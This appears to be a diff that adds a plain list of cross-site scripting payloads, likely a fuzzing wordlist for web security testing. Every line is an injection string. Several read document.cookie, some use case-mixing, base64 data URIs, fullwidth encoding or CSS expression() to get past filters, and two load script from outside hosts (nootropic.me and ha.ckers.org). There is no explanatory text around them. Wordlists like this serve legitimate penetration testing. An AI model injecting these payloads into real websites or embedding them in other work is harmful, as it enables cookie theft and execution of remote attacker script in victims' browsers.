@@ -1,0 +1,22 @@
+<script>alert(1);</script>
+"><script>alert(1);</script>
+<script src=http://nootropic.me/xss.js></script>
+<ScrIpt>alert(1);</SCript>
+<a onmouseover="alert(document.cookie)">XSS</a>
+<a onmouseover=alert(document.cookie)>XSS</a>
+<<script>alert("XSS");//<</script>
+<iframe src="javascript:alert('XSS');"></iframe>
+<iframe src=# onmouseover="alert(document.cookie)"></iframe>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<script src="http://ha.ckers.org/xss.jpg"></script>
+<img src="http://www.example.co.jp/>"onerror="alert(document.cookie)//<">
+%EF%BC%9Cscript%EF%BC%9Ealert(123)%EF%BC%9C/script%EF%BC%9E
+";alert(document.domain)//
+<SELECT NAME="" onmouseover=alert(123)></select>
+<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='></iframe>
+<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='></iframe>
+<svg><style><img/src=x onerror=alert(1)// </b>
+"><svg><script>alert&#40/1/.source&#41</script>
+data:text/html,<script>alert(0)</script>
+<div style="left:expression(alert('xss'))">
+<div style="left:expＲessioＮ(alert('xss'))">
